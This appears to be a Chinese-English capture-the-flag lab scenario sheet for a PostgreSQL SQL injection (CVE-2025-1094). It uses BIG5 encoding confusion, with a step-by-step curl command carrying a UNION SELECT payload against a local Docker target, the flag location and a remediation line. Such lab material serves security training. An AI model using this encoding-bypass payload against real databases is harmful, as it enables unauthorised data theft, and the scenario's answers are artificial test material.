# WEB-07: PostgreSQL Encoding Bypass SQLi

## 场景信息

| 字段 | 值 |
|---|---|
| ID | WEB-07 |
| 名称 | PostgreSQL Encoding Bypass SQLi |
| 技术/CVE | CVE-2025-1094 |
| 难度 | L2 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10107 |

## 场景概述
- 技术：CVE-2025-1094
- 难度：L2
- 交付方式：docker
- 入口端口：10107
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2025-1094 |
| Difficulty | L2 |
| Port | 10107 |
| DB | PostgreSQL 16.6 |
| Encoding | PGCLIENTENCODING=BIG5 |

### Attack Path
```
BIG5 encoding mismatch → SQL injection in search → UNION SELECT → Read flag_holder table → flag
```

### Step-by-Step

```bash
# Step 1: Identify SQLi via encoding confusion
# The app uses: SELECT name, price FROM products WHERE name LIKE '%{keyword}%'
# BIG5 multibyte characters can break out of LIKE string

# Step 2: UNION-based extraction
curl "http://localhost:10107/search?q=%a5%27+UNION+SELECT+flag,1+FROM+flag_holder--"

# Step 3: Read flag
# flag{web-07-xxxxxxxxxxxxxxxx}
```

### Flag Location
- In PostgreSQL table `flag_holder`, column `flag`
- Database: postgres, table created by init.sql

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Web search endpoint and PostgreSQL backend |
| 侦察与前置条件 | Input encoding behavior and PostgreSQL error/query response interpretation |
| 核心漏洞与利用 | Bypass encoding validation to inject PostgreSQL SQL |
| 权限、横向或影响 | Database command execution or sensitive file access |
| 验证 | Use the injected query path to obtain the flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
